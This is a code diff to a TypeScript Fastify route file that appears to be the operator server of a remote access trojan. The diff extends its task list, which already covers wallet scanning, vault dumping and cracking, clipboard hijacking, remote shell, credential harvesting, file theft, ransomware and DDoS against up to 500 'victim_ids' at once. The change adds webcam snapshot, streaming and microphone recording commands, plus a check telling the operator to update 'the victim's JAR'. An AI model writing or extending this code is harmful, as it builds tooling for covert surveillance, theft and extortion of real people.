@@ -13,7 +13,7 @@ import { compareVersion } from '../lib/agent-compat';
 import { capabilityMissing } from '../lib/agent-contract';
 import { mimeFor } from '../lib/mime';
 
-const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'mic', 'ransomware', 'ddos'] as const;
+const TASK_NAMES = ['scan_wallets', 'dump_vault', 'crack_vault', 'clip_start', 'clip_stop', 'clip_set', 'shell', 'harvest', 'screenshot', 'file_pull', 'cancel', 'agent', 'monitor', 'files', 'webcam', 'webcam:snapshot', 'webcam:stream', 'webcam:devices', 'mic', 'mic:record', 'ransomware', 'ddos'] as const;
 
 const enqueueSchema = z.object({
   victim_ids: z.array(z.string().uuid()).min(1).max(500),
@@ -111,7 +111,7 @@ export const taskRoutes: FastifyPluginAsync = async (app) => {
     if (input.name === 'harvest' && 'kind' in input.params && staleAgent('0.3.7')) {
       delete (input.params as Record<string, unknown>).kind;
     }
-    if ((input.name === 'webcam' || input.name === 'mic') && staleAgent('0.3.7')) {
+    if ((input.name === 'webcam' || input.name === 'mic' || input.name.startsWith('webcam:') || input.name === 'mic:record') && staleAgent('0.3.7')) {
       throw bad('agent_old', `${input.name} requiere agente 0.3.7; actualiza el JAR de la víctima`, 409);
     }
     const invalid = validateParams(input.name, input.params);
